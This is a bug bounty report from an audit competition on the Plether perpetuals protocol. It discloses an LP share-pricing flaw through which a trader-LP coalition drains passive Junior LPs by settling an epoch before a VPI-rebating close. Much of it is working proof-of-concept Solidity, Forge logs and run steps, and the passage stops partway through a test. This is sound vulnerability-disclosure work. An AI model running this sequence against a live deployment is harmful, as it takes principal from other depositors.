# \#99132 [SC-Critical] Refundable VPI in HousePool LP Share Pricing Lets a Trader-LP Coalition Withdraw Other LPs' Principal

**Submitted on Nov 12th 2026 at 01:43:55 UTC by @zer0luck_xint for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99132
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

A skew-increasing open pays positive virtual price impact (VPI) into the HousePool, and the open position can reclaim it as a rebate when a skew-reducing close follows. LP share pricing counts that collected but refundable cash as Junior equity, so a Junior redemption settled between the open and the rebating close is paid partly from cash that the remaining Junior LPs fund when the rebate leaves the pool.

A trader and a Junior LP acting together can have the LP epoch settled before the trader's close, either in one permissionless transaction or by committing the close only after the settlement. Repeated over several cycles, a passive Junior holder's fully funded withdrawal falls below its deposit, while the coalition exits with more USDG than it funded.

## Vulnerability Details

**The open pays VPI into the pool, and the position can reclaim it.** A skew-increasing open transfers positive VPI into the HousePool as realized cash. The open position retains its lifetime VPI balance, so a later skew-reducing close can receive a rebate from pool cash:

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L454-L463

**LP share pricing counts the refundable VPI as Junior equity.** HousePool calculates LP distributable equity from physical pool assets, the terminal price delta, and trader claims:

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolAccountingLib.sol#L60-L78

```solidity
        uint256 terminalAssets = engineSnapshot.physicalAssets;
        uint256 terminalLiabilities = engineSnapshot.traderClaimBalanceAssets;
        int256 terminalDelta = engineSnapshot.terminalLpPriceDeltaAssets;
```

The terminal price delta excludes VPI because VPI is settled separately from price profit and loss (ACCOUNTING_SPEC.md:141-142). Keeping VPI outside price profit and loss does not reserve VPI cash that the pool has already collected while the live position can reclaim it. The physical-asset term includes the positive VPI cash collected on the open without accounting for the rebate that the still-open position can receive on a later skew-reducing close, so that cash is priced as withdrawable Junior equity. The rebate is recalculated at the close, capped by the position's accrued VPI, and waived to the extent free pool cash is unavailable. The opposite direction is treated conservatively: the clawback that a live position owes for negative lifetime VPI is held in a dedicated reserve that does not raise LP NAV (ACCOUNTING_SPEC.md:1057-1066).

**Settlement before the close moves the rebate onto the remaining LPs.** LP epoch settlement prices redemption and deposit shares from this equity snapshot, and the redemption becomes a funded claim before the queued close executes:

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L835-L841

The close then applies the same signed VPI curve to the skew reduction and pays a rebate from the cash remaining in the HousePool. Its lifetime clamp limits the rebate to VPI already paid by the position, so the trader recovers at most the VPI it paid and the gain comes from the Junior redemption:

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L103-L118

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L621-L624

**Trigger.** The trader commits the full close 1 second before an LP epoch boundary. A price published at the boundary reaches the caller 7 seconds later. One permissionless transaction uses that price to settle the LP epoch and then execute the queued close. The close cannot fill at a price published at or before its commit time, because order execution requires a publish time later than the commit time. The supplied boundary tick is the first eligible update after the commit, so the close cannot execute against a pre-boundary tick, and LP epoch settlement accepts the same update while positions are open. At 7 seconds after the boundary the same update can settle the LP epoch and execute the close in the order the caller chooses. The Junior LP redemption is already funded when the rebate reduces the remaining pool's value.

## Impact Details

Severity: Critical, Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield.

The coalition takes principal from a passive Junior LP. The passive holder contributes 6 million USDG and makes no trade. Its entire redemption is funded in every run, but it receives less USDG after the coalition's actions. The coalition withdraws its Junior redemption and its remaining trader margin as USDG, finishing above the 15.4 million USDG it funded (15 million of Junior deposits and 400,000 of trader margin).

In the release deployment with release parameters, all runs start from the same snapshot and use the same LP deposits, redemptions, prices and settlement times over 3 cycles, each spanning a deposit epoch, the 1-hour cooldown and a redemption epoch. The first run has no coalition trades. The other 2 runs contain the same opens and close commits and differ only in the order of the queued close and the LP epoch settlement at the boundary tick: in the control an independent executor runs the close first, in the attack one transaction settles the LP epoch first.

| | No coalition trades | Same trades, close first | Same trades, settlement first (attack) |
|---|---:|---:|---:|
| Passive Junior holder withdrawal | 6,000,000.00 | 6,003,208.01 | 5,975,712.35 |
| Coalition result against its funded capital | | -13,144.86 | +14,350.81 |
| Close rebates over the 3 cycles | | 48,958.36 | 49,022.76 |

The settlement order alone lowers the passive Junior holder's withdrawal by 27,495.66 USDG and raises the coalition's cash by 27,495.67 USDG, and turns the coalition's trade costs into a profit. The redemption lowers pool depth before the close, so the lifetime clamp binds and in every attack cycle the rebate equals the VPI the open paid (16,324.24 USDG in the first cycle). Over the 3 cycles the close rebates differ between the 2 orders by 64.40 USDG and the VPI paid on the opens by 21.41 USDG, so the trader's net VPI differs by 43.00 USDG, a small part of the 27,495.66 USDG difference; the principal transfer comes from the Junior redemption that settlement prices with the collected VPI still in LP equity (15,011,807.91 USDG in the first attack cycle against 15,000,000.00 without trades).

Prerequisites:
- A Junior-funded pool in which the coalition supplies a large share of Junior capital. The test pool holds 15 million USDG from the coalition's Junior LP, 6 million USDG from the passive Junior LP, and the permanent Senior and Junior seed positions.
- A skew-increasing open that pays VPI. The trader funds 400,000 USDG of margin and opens an 8.28 million USDG notional SHORT in each cycle, 39.43% to 39.50% of pool depth across the 3 cycles, inside the 40% maximum skew ratio of the release parameters, with no other position open. The VPI paid, and with it the amount moved, depends on that skew.
- Capital recycling. After an exit, the coalition reinvests 14.98 million USDG from its own redemption wallet and waits through the 1-hour cooldown that starts at deposit activation. No additional outside LP deposit is needed.
- Settlement before the close. In the main sequence the caller supplies a valid boundary-published price and settles the LP epoch and executes the close in one transaction. If another executor ran the queued close in an earlier transaction, the Junior redemption in that cycle would be priced after the rebate, which removes this route for that cycle while the trader still pays its execution fees. The trader avoids this race by committing the close only after the settlement: the close then fills only on a price published after its commit time, so no executor can run it first. With that ordering the passive Junior holder's withdrawal is 24,287.27 USDG lower than without the coalition's trades and the coalition exits 14,350.42 USDG above its funded capital (`test_threeCyclesCloseCommittedAfterSettlement`).
- Transaction costs. The coalition result counts every protocol charge, carry and the execution fee recorded in the trader's balance. It does not include Arbitrum gas or the Pyth update fee, which the local Pyth double does not charge; settlement and order execution pay those per call.
- No privileged role, incorrect oracle value or unusual configuration is involved. Every call is a public function used with valid price updates.

## Recommendation

Track the refundable portion of positive lifetime VPI for each open position and deduct its aggregate from the equity used to price LP shares. Update that amount atomically on opens, increases, reductions, closes, and liquidations. Keep the VPI settlement and lifetime clamp unchanged, and use the same adjusted equity for redemption and deposit pricing.

## References

- Audit commit: https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8
- VPI settlement outside price profit and loss, and the negative-VPI reserve: `packages/perps/ACCOUNTING_SPEC.md:141-142`, `:1057-1066`
- Plether accounting model: `packages/perps/ACCOUNTING_SPEC.md:21-36`
- Release parameters: `packages/perps/DEPLOYMENT.md` (Initial release parameters) and `script/DeployPerpsArbitrumSepolia.s.sol`

## Proof of Concept

## Proof of Concept

The test deploys the release contracts with `script/DeployPerpsArbitrumSepolia.s.sol` inside Forge through `ReleaseFixture.sol` (source at the end of this section). In-scope contracts are unmodified. Only out-of-scope components are mocked:
- Pyth: the repository's `test/mocks/MockPyth.sol`, etched at the release Pyth address.
- USDG: the release `MockUSDG`.
- The ArbSys block-number precompile.

The PoC file `VpiNavLpSandwich.t.sol` contains 8 tests; the command below runs the 3 three-cycle tests. Steps in `test_threeCyclesDrainSamePassiveJuniorHolder`, all through public entry points; the six Pyth feeds stay at a 1.20 basket with 1 bp confidence:
1. The coalition's Junior LP deposits 15,000,000 USDG and the passive Junior LP 6,000,000 USDG. The trader funds 400,000 USDG of margin. The test takes a snapshot.
2. The coalition queues its full Junior redemption for the next hourly LP epoch.
3. The trader opens an 8.28 million USDG notional SHORT that executes 53 seconds before the boundary and pays VPI into the pool. 1 second before the boundary it commits the full close.
4. 7 seconds after the boundary, with a price published at the boundary, one transaction from an address with no role settles the LP epoch and then executes the queued close.
5. The coalition claims its redemption, redeposits 14,980,000 USDG from its redemption proceeds, waits for activation and the 1-hour cooldown, queues the next redemption, and steps 3-4 repeat twice.
6. The passive Junior LP redeems all its shares, and the trader withdraws its margin.
7. From the same snapshot, the comparison runs the same deposits, redemptions and settlement times without the trader's open and close.
8. The test checks full funding and zero pending shares for the passive LP's redemption, full trader-margin withdrawal, the passive LP's lower withdrawal, the coalition's cash above its funded capital, and that the USDG held by the custody contracts and actor wallets is unchanged by every cycle and equals the token supply at the end.

`test_threeCyclesCloseBeforeLpSettlementControl` runs the attack sequence and, from the same snapshot, a control with identical trades, commit times and prices in which an independent executor runs the queued close first and the LP epoch is settled afterwards with the same boundary tick. It checks that settlement before the close lowers the passive withdrawal and raises the coalition's cash by the same amount within 1 USDG, that the coalition ends below its funded capital with the close first and above it with settlement first, and that the close rebates of the 2 orders differ by less than 100 USDG.

`test_threeCyclesCloseCommittedAfterSettlement` runs the same sequence, except that the trader commits each close in the block after the LP epoch settlement and an independent executor runs it on a later price tick, and compares the passive Junior holder's withdrawal with the run without coalition trades.

On a fresh clone of the audit commit, run `git submodule update --init --recursive`. Create `test/poc/` at the repository root, place `ReleaseFixture.sol` and `VpiNavLpSandwich.t.sol` (sources at the end of this section) in it, then run from the repository root with Forge 1.5.1:

```bash
forge test --match-path test/poc/VpiNavLpSandwich.t.sol --match-test test_threeCycles -vv
```

Excerpt from the output of the command above for `test_threeCyclesCloseBeforeLpSettlementControl` (deployment and per-cycle lines omitted):

```
[PASS] test_threeCyclesCloseBeforeLpSettlementControl() (gas: 34887083)
Logs:
  same trades: passive Junior withdrawal, close first / settlement first 6003208006766 5975712346088
  same trades: coalition USDG, close first / settlement first 15386855144542 15414350809802
  same trades: summed close rebates, close first / settlement first 48958.356806 USDG 49022.758544 USDG
  same trades: coalition result vs funded capital, close first -13144.855458 USDG
  same trades: coalition result vs funded capital, settlement first 14350.809802 USDG
  ordering: passive Junior loss 27495.660678 USDG
  ordering: coalition gain 27495.665260 USDG
  ordering: close rebate difference 64.401738 USDG
```

Excerpt from the same output for `test_threeCyclesCloseCommittedAfterSettlement` (deployment and per-cycle lines omitted):

```
[PASS] test_threeCyclesCloseCommittedAfterSettlement() (gas: 23412708)
Logs:
  close committed after settlement: passive Junior withdrawal, no trades / attack 5999999999949 5975712731136
  close committed after settlement: passive Junior cash loss 24287.268813 USDG
  close committed after settlement: coalition result vs funded capital 14350.424754 USDG
```

Excerpt from the same output for `test_threeCyclesDrainSamePassiveJuniorHolder`: the first attack cycle (deployment lines and the comparison cycles omitted):

```
[PASS] test_threeCyclesDrainSamePassiveJuniorHolder() (gas: 23238627)
Logs:
  b-53s trader opens SHORT; pool depth before it 21000002.000000 USDG
        VPI the open paid into the pool (vpiAccrued)         16324.242110 USDG
  b-1s trader commits the full close (fills only on a price published at or after b)
  b+7s  OrderRouter.settleLpEpoch funds the attacker LP redemption 15011807.909495 USDG
  b+7s  close executes after settlement using the same boundary tick; pool depth after it 5991919.580417 USDG
        VPI rebate (close receipt) 16324.242110 USDG
  end   attacker LP USDG received  15011807.909495 USDG
        attacker trader balance    392962.227399 USDG
        entrant LP value           0.000000 USDG
        honest Junior LP value     5991917.581746 USDG
        USDG in 5 custody contracts + actor wallets, before / after 21400002.000000 USDG 21400002.000000 USDG
        USDG total supply minus custody and wallets 0.000000 USDG
```

Excerpt from the same output: the end of `test_threeCyclesDrainSamePassiveJuniorHolder` and the suite summary (the other cycles omitted):

```
  three-cycle passive Junior comparison withdrawal 5999999999949
  three-cycle passive Junior attacked withdrawal 5975712346088
  three-cycle passive Junior cash loss 24287.653861 USDG
  three-cycle attacker cash gain over comparison 14350.809841 USDG
  three-cycle attacker absolute cash gain 14350.809802 USDG

Suite result: ok. 3 passed; 0 failed; 0 skipped; finished in 77.03ms (146.38ms CPU time)
```

### Source files

#### `ReleaseFixture.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

// Deploys the release contracts with script/DeployPerpsArbitrumSepolia.s.sol inside Forge.
// Pyth, USDG and ArbSys are replaced by local test components; in-scope contracts are unmodified.

import {DeployPerpsArbitrumSepolia} from "../../script/DeployPerpsArbitrumSepolia.s.sol";
import {MockPyth} from "../mocks/MockPyth.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {PletherOracle} from "@plether/perps/PletherOracle.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {Test, console2} from "forge-std/Test.sol";

/// @dev Mirrors the Arbitrum precompile's block-number view inside the local test EVM.
contract ReleaseFixtureArbSys {

    function arbBlockNumber() external view returns (uint256) {
        return block.number;
    }

}

abstract contract ReleaseFixture is Test {

    address internal constant RELEASE_PYTH = 0x0B73614636C855Bf23F342F307FB981A3e47f42B;
    uint256 internal constant DEPLOYER_KEY = 0xA11CE;
    uint256 internal constant MONDAY_MORNING = 1_709_532_000; // Mon 2024-03-04 06:00 UTC (live market)
    uint256 internal constant BASKET_1_20 = 120_000_000; // normalized basket mark 1.20 (8 decimals)
    uint8 internal constant MODE_LIVE = 1;
    uint8 internal constant MODE_FAD = 2;
    uint8 internal constant MODE_FROZEN = 4;
    uint8 internal constant MODE_ANY = 7;

    DeployPerpsArbitrumSepolia.DeployedContracts internal d;
    address internal owner;
    address internal keeper = makeAddr("keeper");
    uint256 internal clientNonce;

    function setUp() public virtual {
        vm.chainId(421_614);
        vm.warp(MONDAY_MORNING);
        ReleaseFixtureArbSys arbSys = new ReleaseFixtureArbSys();
        vm.etch(address(100), address(arbSys).code);
        MockPyth pyth = new MockPyth();
        vm.etch(RELEASE_PYTH, address(pyth).code);
        vm.setEnv("TEST_PRIVATE_KEY", vm.toString(DEPLOYER_KEY));
        d = DeployPerpsArbitrumSepolia(deployCode("DeployPerpsArbitrumSepolia.s.sol:DeployPerpsArbitrumSepolia")).run();
        owner = vm.addr(DEPLOYER_KEY);

        // Permanent 1 USDG seeds per tranche (release values), then activation.
        d.settlementToken.mint(owner, 2e6);
        vm.startPrank(owner);
        d.settlementToken.approve(address(d.housePool), 2e6);
        d.housePool.initializeSeedPosition(false, 1e6, owner);
        d.housePool.initializeSeedPosition(true, 1e6, owner);
        d.housePool.activateTrading();
        vm.stopPrank();

        _setBasketPrices(BASKET_1_20);
        d.router.updateMarkPrice(_updateData());
    }

    // ---------------------------------------------------------------- prices

    function _oracle() internal view returns (PletherOracle) {
        return PletherOracle(d.pletherOracle);
    }

    /// @dev Sets all six feeds so the normalized basket equals `basketPrice`, published at the current block time.
    function _setBasketPrices(
        uint256 basketPrice
    ) internal {
        _setBasketPricesAt(basketPrice, vm.getBlockTimestamp());
    }

    function _setBasketPricesAt(
        uint256 basketPrice,
        uint256 publishTime
    ) internal {
        for (uint256 i; i < 6; ++i) {
            _setFeed(i, basketPrice, publishTime);
        }
    }

    /// @dev Sets one component so that it alone would give normalized basket `basketPrice`, at `publishTime`.
    function _setFeed(
        uint256 i,
        uint256 basketPrice,
        uint256 publishTime
    ) internal {
        PletherOracle oracle = _oracle();
        uint256 normalizedPrice = oracle.basePrices(i) * basketPrice / 1e8;
        uint256 feedPrice = oracle.inversions(i) ? 1e16 / normalizedPrice : normalizedPrice;
        MockPyth(RELEASE_PYTH).setPrice(oracle.pythFeedIds(i), int64(uint64(feedPrice)), int32(-8), publishTime);
    }

    /// @dev Same as _setFeed with an explicit confidence (in feed units).
    function _setFeedWithConf(
        uint256 i,
        uint256 basketPrice,
        uint64 conf,
        uint256 publishTime
    ) internal {
        PletherOracle oracle = _oracle();
        uint256 normalizedPrice = oracle.basePrices(i) * basketPrice / 1e8;
        uint256 feedPrice = oracle.inversions(i) ? 1e16 / normalizedPrice : normalizedPrice;
        MockPyth(RELEASE_PYTH).setPrice(oracle.pythFeedIds(i), int64(uint64(feedPrice)), conf, int32(-8), publishTime);
    }

    /// @dev A non-encoded payload makes the MockPyth double use the configured per-feed prices.
    function _updateData() internal pure returns (bytes[] memory data) {
        data = new bytes[](1);
        data[0] = "";
    }

    function _refreshMark(
        uint256 basketPrice
    ) internal {
        _setBasketPrices(basketPrice);
        vm.prank(keeper);
        d.router.updateMarkPrice(_updateData());
    }

    // ---------------------------------------------------------------- time

    function _warp(
        uint256 dt
    ) internal {
        vm.warp(vm.getBlockTimestamp() + dt);
        vm.roll(vm.getBlockNumber() + 1 + dt / 4);
    }

    function _warpTo(
        uint256 t
    ) internal {
        uint256 nowTs = vm.getBlockTimestamp();
        require(t >= nowTs, "warp back");
        vm.roll(vm.getBlockNumber() + 1 + (t - nowTs) / 4);
        vm.warp(t);
    }

    // ---------------------------------------------------------------- USDG and LPs

    function _mint(
        address to,
        uint256 amount
    ) internal {
        d.settlementToken.mint(to, amount);
    }

    function _vault(
        bool senior
    ) internal view returns (TrancheVault) {
        return senior ? d.seniorVault : d.juniorVault;
    }

    function _requestDeposit(
        bool senior,
        address lp,
        uint256 assets
    ) internal returns (uint256 requestId) {
        TrancheVault v = _vault(senior);
        _mint(lp, assets);
        vm.startPrank(lp);
        d.settlementToken.approve(address(v), assets);
        requestId = v.requestDeposit(assets, lp, lp);
        vm.stopPrank();
    }

    /// @dev Warps to the request's epoch start (if not past) and settles through the Router's atomic oracle route.
    function _settleEpoch(
        uint256 requestId,
        uint256 basketPrice
    ) internal {
        uint256 start = d.housePool.lpEpochStart(requestId);
        if (vm.getBlockTimestamp() < start) {
            _warpTo(start);
        }
        _setBasketPrices(basketPrice);
        vm.prank(keeper);
        d.router.settleLpEpoch(_updateData());
    }

    function _claimDeposit(
        bool senior,
        address lp,
        uint256 requestId
    ) internal returns (uint256 shares) {
        TrancheVault v = _vault(senior);
        uint256 claimable = v.claimableDepositRequest(requestId, lp);
        vm.prank(lp);
        shares = v.claimDeposit(requestId, claimable, lp, lp);
    }

    /// @dev Request, settle at `basketPrice`, claim. Returns shares.
    function _lpDeposit(
        bool senior,
        address lp,
        uint256 assets,
        uint256 basketPrice
    ) internal returns (uint256 shares) {
        uint256 requestId = _requestDeposit(senior, lp, assets);
        _settleEpoch(requestId, basketPrice);
        shares = _claimDeposit(senior, lp, requestId);
    }

    function _requestRedeem(
        bool senior,
        address lp,
        uint256 shares
    ) internal returns (uint256 requestId) {
        vm.prank(lp);
        requestId = _vault(senior).requestRedeem(shares, lp, lp);
    }

    function _claimRedeem(
        bool senior,
        address lp,
        uint256 requestId
    ) internal returns (uint256 assets) {
        TrancheVault v = _vault(senior);
        uint256 shares = v.claimableRedeemRequest(requestId, lp);
        vm.prank(lp);
        assets = v.claimRedeem(requestId, shares, lp, lp);
    }

    // ---------------------------------------------------------------- traders

    function _fundTrader(
        address trader,
        uint256 assets
    ) internal {
        _mint(trader, assets);
        vm.startPrank(trader);
        d.settlementToken.approve(address(d.clearinghouse), assets);
        d.clearinghouse.depositMargin(assets);
        vm.stopPrank();
    }

    /// @dev Permissive bounds: no practical ceilings (zero means zero, so ceilings use max values).
    function _bounds(
        uint8 modes
    ) internal view returns (OrderV3Types.ExecutionBounds memory b) {
        b.submitBy = uint64(vm.getBlockTimestamp() + 60);
        b.executionWindowSeconds = 60;
        b.allowedExecutionModes = modes;
        b.expectedConfigHash = d.lifecycleBook.currentExecutionConfigHash();
        b.maxExecutionBountyAssets = type(uint256).max;
        b.maxExecutionNotionalAssets = type(uint256).max;
        b.maxGrossAccountDebitAssets = type(uint256).max;
        b.maxActionChargeAssets = type(uint256).max;
        b.maxExplicitFeesAssets = type(uint256).max;
        b.maxPostPositionSize = type(uint256).max;
        b.minPostSettlementBalanceAssets = 0;
        b.minPostPositionEquityAssets = 0;
        b.maxPostLeverageBps = type(uint32).max;
    }

    function _nextClientId() internal returns (bytes32) {
        return bytes32(uint256(keccak256(abi.encode("poc", ++clientNonce))));
    }

    /// @param size synthetic size in 1e18 units; must be a multiple of 100e18 (positionSizeQuantum 1e20).
    function _openReq(
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        uint256 targetPrice
    ) internal returns (OrderV3Types.OrderRequest memory r) {
        r.clientOrderId = _nextClientId();
        r.side = side;
        r.sizeDelta = size;
        r.marginDelta = margin;
        r.targetPrice = targetPrice;
        r.isClose = false;
        r.bounds = _bounds(MODE_LIVE | MODE_FAD);
    }

    function _closeReq(
        CfdTypes.Side side,
        uint256 size,
        uint256 targetPrice
    ) internal returns (OrderV3Types.OrderRequest memory r) {
        r.clientOrderId = _nextClientId();
        r.side = side;
        r.sizeDelta = size;
        r.marginDelta = 0;
        r.targetPrice = targetPrice;
        r.isClose = true;
        r.bounds = _bounds(MODE_ANY);
    }

    function _commit(
        address trader,
        OrderV3Types.OrderRequest memory r
    ) internal returns (uint64 orderId) {
        vm.prank(trader);
        orderId = d.router.commitOrder(r);
    }

    /// @dev Advances 7 s / 2 blocks (past the commit tick), publishes `basketPrice`, executes as `keeper`.
    function _execute(
        uint64 orderId,
        uint256 basketPrice
    ) internal returns (OrderV3Types.ExecutionResult memory result) {
        vm.warp(vm.getBlockTimestamp() + 7);
        vm.roll(vm.getBlockNumber() + 2);
        _setBasketPrices(basketPrice);
        vm.prank(keeper);
        result = d.router.executeOrder(orderId, _updateData());
    }

    function _openPosition(
        address trader,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        uint256 basketPrice
    ) internal returns (OrderV3Types.ExecutionResult memory result) {
        // Slippage targets: a LONG gains when the basket falls, so it opens at a price >= target and closes at <= target.
        uint256 target = side == CfdTypes.Side.LONG ? 1 : basketPrice * 2;
        uint64 id = _commit(trader, _openReq(side, size, margin, target));
        result = _execute(id, basketPrice);
    }

    function _closePosition(
        address trader,
        CfdTypes.Side side,
        uint256 size,
        uint256 basketPrice
    ) internal returns (OrderV3Types.ExecutionResult memory result) {
        uint256 target = side == CfdTypes.Side.LONG ? basketPrice * 2 : 1;
        uint64 id = _commit(trader, _closeReq(side, size, target));
        result = _execute(id, basketPrice);
    }

    function _requireExecuted(
        OrderV3Types.ExecutionResult memory r,
        string memory label
    ) internal pure {
        if (r.status != OrderV3Types.LifecycleStatus.Executed) {
            console2.log("order not executed:", label);
            console2.log("  status", uint256(uint8(r.status)));
            console2.log("  terminalReason", uint256(uint8(r.terminalReason)));
            console2.log("  pendingReason", uint256(uint8(r.pendingReason)));
            revert(label);
        }
    }

    function _liquidate(
        address account,
        uint256 basketPrice
    ) internal {
        _setBasketPrices(basketPrice);
        vm.prank(keeper);
        d.router.executeLiquidation(account, _updateData());
    }

    // ---------------------------------------------------------------- state views

    function _poolAssets() internal view returns (uint256) {
        return d.housePool.totalAssets();
    }

    function _usdgOf(
        address a
    ) internal view returns (uint256) {
        return d.settlementToken.balanceOf(a);
    }

    function _logState(
        string memory label
    ) internal view {
        console2.log("==", label);
        console2.log("  pool totalAssets      ", d.housePool.totalAssets());
        console2.log("  pool raw USDG         ", _usdgOf(address(d.housePool)));
        console2.log("  seniorPrincipal       ", d.housePool.seniorPrincipal());
        console2.log("  juniorPrincipal       ", d.housePool.juniorPrincipal());
        console2.log("  clearinghouse USDG    ", _usdgOf(address(d.clearinghouse)));
        console2.log("  seniorVault USDG      ", _usdgOf(address(d.seniorVault)));
        console2.log("  juniorVault USDG      ", _usdgOf(address(d.juniorVault)));
        console2.log("  total trader claims   ", d.engine.totalTraderClaimBalanceAssets());
        console2.log("  engine mark           ", d.engine.lastMarkPrice());
        console2.log("  degradedMode          ", d.engine.degradedMode());
    }

    /// @dev Sum of USDG held by every in-scope custody contract (Clearinghouse, HousePool, both vaults, Engine).
    function _custodyUsdg() internal view returns (uint256) {
        return _usdgOf(address(d.clearinghouse)) + _usdgOf(address(d.housePool)) + _usdgOf(address(d.seniorVault))
            + _usdgOf(address(d.juniorVault)) + _usdgOf(address(d.engine));
    }

}
```

#### `VpiNavLpSandwich.t.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {ReleaseFixture} from "./ReleaseFixture.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderLifecycleBook} from "@plether/perps/interfaces/IOrderLifecycleBook.sol";
import {console2} from "forge-std/Test.sol";
import {Vm} from "forge-std/Vm.sol";

interface IAtomicLpAndOrderRouter {
    function settleLpEpoch(bytes[] calldata updateData) external payable;
    function executeOrder(uint64 orderId, bytes[] calldata updateData)
        external payable returns (OrderV3Types.ExecutionResult memory);
}

contract AtomicLpSettlementAndClose {
    function run(address router, uint64 closeOrderId, bytes[] calldata updateData,
        uint256 settlementFee, uint256 closeFee)
        external payable returns (OrderV3Types.ExecutionResult memory result)
    {
        require(msg.value == settlementFee + closeFee, "oracle funding");
        IAtomicLpAndOrderRouter(router).settleLpEpoch{value: settlementFee}(updateData);
        result = IAtomicLpAndOrderRouter(router).executeOrder{value: closeFee}(closeOrderId, updateData);
        require(result.status == OrderV3Types.LifecycleStatus.Executed, "close pending");
    }

}

/// @notice Measures Junior share pricing while a skew-increasing open holds positive VPI that its later close rebates.
///         A queued close is committed before the LP epoch, then an atomic caller settles the epoch and executes the
///         close after receiving a boundary-published price. All prices are 1.20 with 1 bp confidence on 6 feeds.
contract VpiNavLpSandwichTest is ReleaseFixture {
    function setUp() public override {
        super.setUp();
        keeper = address(new AtomicLpSettlementAndClose());
    }
    address internal seniorLp = makeAddr("seniorLp");
    address internal honestLp = makeAddr("honestJuniorLp");
    address internal attackerLp = makeAddr("attackerJuniorLp");
    address internal entrantLp = makeAddr("entrantJuniorLp");
    address internal trader = makeAddr("attackerTrader");

    uint256 internal constant SENIOR = 20_000_000e6;
    uint256 internal constant HONEST_J = 6_000_000e6;
    uint256 internal constant ATTACKER_J = 15_000_000e6;
    uint256 internal constant REINVEST = 14_980_000e6;
    uint256 internal constant SHORT_SIZE = 13_500_000e18; // 16.2M USDG notional at 1.20 = 0.395 of the 41M depth
    uint256 internal attackerAmount = ATTACKER_J;
    uint256 internal shortSize = SHORT_SIZE;
    bool internal commitAfterSettlement; // the trader commits the close only after the LP epoch settlement
    uint256 internal seniorAmount = SENIOR;
    bool internal withEntrant = true;

    uint256 internal honestShares;
    uint256 internal seniorShares;
    uint256 internal redeemId;
    uint64 internal openId;
    uint64 internal closeId;

    struct Out {
        uint256 lpUsdg; // USDG paid by the attacker LP's redemption
        uint256 traderBal; // attacker trader clearinghouse balance (flat at the end)
        uint256 entrantShares;
        uint256 entrantValue;
        uint256 honestValue;
        uint256 seniorValue;
        uint256 treasuryBal;
        uint256 keeperBal;
        int256 vpiAccrued; // position vpiAccrued after the open
        int256 openVpi; // receipt economics.vpiAssets
        int256 closeVpi;
    }

    function test_vpiRefundableChargeInflatesLpNav() public {
        _book();
        uint256 snap = vm.snapshotState();
        console2.log("=== REFERENCE: same LP requests, no trades");
        Out memory b = _run(false);
        vm.revertToState(snap);
        console2.log("=== ATTACK: open skew at b-53s, commit close at b-1s, settle and close at b");
        Out memory a = _run(true);

        int256 lpGain = _sub(a.lpUsdg, b.lpUsdg);
        int256 traderLeg = _sub(a.traderBal, b.traderBal);
        int256 coalition = lpGain + traderLeg;
        int256 entrant = _sub(a.entrantValue, b.entrantValue);
        int256 honest = _sub(a.honestValue, b.honestValue);
        int256 senior = _sub(a.seniorValue, b.seniorValue);
        int256 treasury = _sub(a.treasuryBal, b.treasuryBal);
        int256 keeperGain = _sub(a.keeperBal, b.keeperBal);
        console2.log("=== ATTACK minus REFERENCE");
        console2.log("attacker LP redemption gain            ", _usd(lpGain));
        console2.log("attacker trader leg (fees, VPI, conf)  ", _usd(traderLeg));
        console2.log("COALITION NET                          ", _usd(coalition));
        console2.log("entrant LP value delta                 ", _usd(entrant));
        console2.log("entrant Junior shares comparison / attack", b.entrantShares, a.entrantShares);
        console2.log("honest Junior LP value delta           ", _usd(honest));
        console2.log("Senior LP value delta                  ", _usd(senior));
        console2.log("treasury delta (open fee)              ", _usd(treasury));
        console2.log("keeper delta (execution bounties)      ", _usd(keeperGain));
        console2.log("sum over all parties (rounding only)   ", _usd(coalition + entrant + honest + senior + treasury + keeperGain));
        console2.log("VPI paid by the open (vpiAccrued)      ", _usd(a.vpiAccrued));
        console2.log("VPI on open receipt / close receipt    ", _usd(a.openVpi), _usd(a.closeVpi));
        console2.log("VPI paid minus rebate received         ", _usd(a.vpiAccrued + a.closeVpi));
        console2.log("check (a) coalition net > 0            ", coalition > 0);
        console2.log("check (b) entrant below comparison       ", entrant < 0);

        assertGt(coalition, 0, "(a) coalition profits after measured protocol charges and carry");
        assertLt(entrant, 0, "(b) entrant LP ends below comparison");
        assertGt(a.vpiAccrued, 0, "open paid positive VPI");
        assertEq(a.openVpi, a.vpiAccrued, "open receipt VPI equals position vpiAccrued");
        assertLe(-a.closeVpi, a.vpiAccrued, "(c) rebate never exceeds the VPI paid (no depth amplification)");
        assertApproxEqRel(-a.closeVpi, a.vpiAccrued, 0.001e18, "(c) trader VPI round trip nets to zero");
    }

    function test_entrantPrincipalLossSurvivesRedemption() public {
        _book();
        uint256 snap = vm.snapshotState();

        Out memory comparison = _run(false);
        _warp(3600);
        uint256 comparisonRequest = _requestRedeem(false, entrantLp, comparison.entrantShares);
